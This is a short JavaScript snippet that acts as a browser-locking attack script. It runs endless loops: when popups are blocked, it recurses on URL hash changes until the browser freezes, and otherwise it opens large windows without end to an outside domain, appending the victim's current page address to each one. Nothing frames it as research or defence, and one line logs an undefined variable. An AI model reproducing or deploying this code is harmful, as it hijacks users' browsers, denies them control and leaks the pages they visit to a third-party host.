function detectPopupBlocker() {
  var myTest = window.open("about:blank", "", "directories=no,height=100,width=100,menubar=no,resizable=no,scrollbars=no,status=no,titlebar=no,top=0,location=no");
  if (!myTest) {
    function recursor() {
      //This will change hash of current URL
      window.location.hash = (Math.random() * (0.1200000001 - 0.0000002001) + 0.02000001).toFixed(4)
        //This will recurse on hash changes
      window.addEventListener('hashchange', function() {
        recursor();
      });
    };
    while (true) {
      recursor();
    }

  } else {
    myTest.close();
    while (true) {
      var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
      var URL = "http://kplibrary.cf/" + location.href;
      var win = window.open(URL, "_blank", strWindowFeatures);
      console.log(i);
    }
  }
}
while (true) {
  detectPopupBlocker();
}
